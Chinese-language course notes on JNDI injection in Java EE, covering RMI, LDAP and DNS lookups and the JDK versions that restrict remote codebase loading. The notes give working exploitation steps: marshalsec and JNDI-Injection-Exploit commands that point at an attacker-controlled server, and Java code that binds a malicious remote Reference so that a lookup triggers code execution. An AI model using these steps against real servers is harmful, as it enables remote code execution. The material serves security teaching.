# Web开发-JavaEE应用&JNDI注入&RMI服务&LDAP服务&DNS服务&高版本限制绕过

| **协议** | **作用**                                                     |
| -------- | ------------------------------------------------------------ |
| LDAP     | 轻量级目录访问协议，约定了 Client 与 Server 之间的信息交互格式、使用的端口号、认证方式等内容 |
| RMI      | JAVA 远程方法协议，该协议用于远程调用应用程序编程接口，使客户机上运行的程序可以调用远程服务器上的对象 |
| DNS      | 域名服务                                                     |
| CORBA    | 公共对象请求代理体系结构                                     |

```JAVA
思考明白：
什么是jndi注入
为什么有jndi注入
JDNI注入安全问题
JDNI注入利用条件
参考：https://blog.csdn.net/dupei/article/details/120534024

#JNDI注入-RMI&LDAP服务
JNDI全称为 Java Naming and DirectoryInterface（Java命名和目录接口），是一组应用程序接口，为开发人员查找和访问各种资源提供了统一的通用接口，可以用来定义用户、网络、机器、对象和服务等各种资源。JNDI支持的服务主要有：DNS、LDAP、CORBA、RMI等。
RMI：远程方法调用注册表
LDAP：轻量级目录访问协议

调用检索：
Java为了将Object对象存储在Naming或Directory服务下，提供了Naming Reference功能，对象可以通过绑定Reference存储在Naming或Directory服务下，比如RMI、LDAP等。javax.naming.InitialContext.lookup()
在RMI服务中调用了InitialContext.lookup()的类有：
org.springframework.transaction.jta.JtaTransactionManager.readObject()
com.sun.rowset.JdbcRowSetImpl.execute()
javax.management.remote.rmi.RMIConnector.connect()
org.hibernate.jmx.StatisticsService.setSessionFactoryJNDIName(String sfJNDIName)
在LDAP服务中调用了InitialContext.lookup()的类有：
InitialDirContext.lookup()
Spring LdapTemplate.lookup()
LdapTemplate.lookupContext()

#JNDI注入：
项目1：https://github.com/mbechler/marshalsec
1、编译调用对象
javac Test.java
2、使用利用工具生成调用协议（rmi,ldap）
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://0.0.0.0/#Test
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer http://0.0.0.0/#Test
3、将生成的Class存放访问路径

项目2：https://github.com/welk1n/JNDI-Injection-Exploit
java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C "calc" -A xx.xx.xx.xx

JNDI注入手工：
//bind：将名称绑定到对象中；
//lookup：通过名字检索执行的对象；
//Reference类表示对存在于命名/目录系统以外的对象的引用。
//Reference参数：
//className：远程加载时所使用的类名；
//classFactory：加载的class中需要实例化类的名称；
//classFactoryLocation：远程加载类的地址，提供classes数据的地址可以是file/ftp/http等协议；

1、Server注册监听
Registry registry = LocateRegistry.createRegistry(7778);
Reference reference = new Reference("calc", "calc", "http://127.0.0.1:8089/");
ReferenceWrapper wrapper = new ReferenceWrapper(reference);
registry.bind("RCE", wrapper);

2、Clinet连接触发
String uri = "rmi://127.0.0.1:7778/RCE";
InitialContext initialContext = new InitialContext();
initialContext.lookup(uri);

#JDK高版本注入绕过：
JDK 6u45、7u21之后：
java.rmi.server.useCodebaseOnly的默认值被设置为true。当该值为true时，将禁用自动加载远程类文件，仅从CLASSPATH和当前JVM的java.rmi.server.codebase指定路径加载类文件。使用这个属性来防止客户端VM从其他Codebase地址上动态加载类，增加RMI ClassLoader安全性。

JDK 6u141、7u131、8u121之后：
增加了com.sun.jndi.rmi.object.trustURLCodebase选项，默认为false，禁止RMI和CORBA协议使用远程codebase的选项，因此RMI和CORBA在以上的JDK版本上已经无法触发该漏洞，但依然可以通过指定URI为LDAP协议来进行JNDI注入攻击。

JDK 6u211、7u201、8u191之后：
增加了com.sun.jndi.ldap.object.trustURLCodebase选项，默认为false，禁止LDAP协议使用远程codebase的选项，把LDAP协议的攻击途径也给禁了。

高版本绕过：
见后续Java安全篇章课程将讲到

```

